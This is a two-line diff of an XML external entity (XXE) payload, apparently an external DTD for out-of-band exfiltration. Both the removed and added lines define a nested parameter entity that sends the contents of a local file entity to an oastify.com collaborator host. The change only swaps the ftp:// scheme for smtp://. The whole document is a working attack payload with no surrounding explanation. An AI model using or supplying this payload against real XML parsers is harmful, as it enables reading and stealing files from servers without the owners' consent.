@@ -1,2 +1,2 @@
-<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'ftp://rxsg5atomglinllxpzaw9k76yx4oshj58.oastify.com/%file;'>">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'smtp://rxsg5atomglinllxpzaw9k76yx4oshj58.oastify.com/%file;'>">
 %stack;
